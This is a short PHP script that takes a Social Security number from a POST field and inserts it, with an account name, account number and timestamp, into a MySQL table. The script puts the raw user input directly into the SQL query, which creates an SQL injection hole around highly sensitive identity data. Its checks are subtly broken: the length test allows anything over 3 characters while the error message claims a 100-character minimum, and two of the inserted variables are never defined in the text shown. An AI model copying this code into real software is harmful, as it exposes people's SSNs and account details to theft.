<?php

require 'connection.php';


include 'admin_init.php';




$errors = array();








if(isset($_POST['ssn'])){

    if(!empty($_POST['ssn'])){


if(strlen($_POST['ssn']) > 3){


$ssn = $_POST['ssn'];


}else{

    array_push($errors, '<span style="color:red;">ssn length must be greater than 100 characters</span>');


}


    }else{
    array_push($errors, '<span style="color:red;">ssn is blank</span>');


    }







}
else{

    array_push($errors, 'ssn is required');
}














if(empty($errors)){



    


$date = date_create();

 $date = date_timestamp_get($date);



$query =mysqli_query($conn,"INSERT INTO `ssn`(`account_name`, `account_number`, `ssn`,  `date`)


 VALUES ('$account_name','$account_number','$ssn', '$date')");




if($query){

echo '<p style="color:green;">ssn added successfully</p>';


}else{
echo '<p style="color:red;">Registration failed please try again later</p>';


}





}else{


echo '';

   foreach($errors as $key => $err){

echo ' <p>' .$err . '</p>';
   }


echo '';


}




?>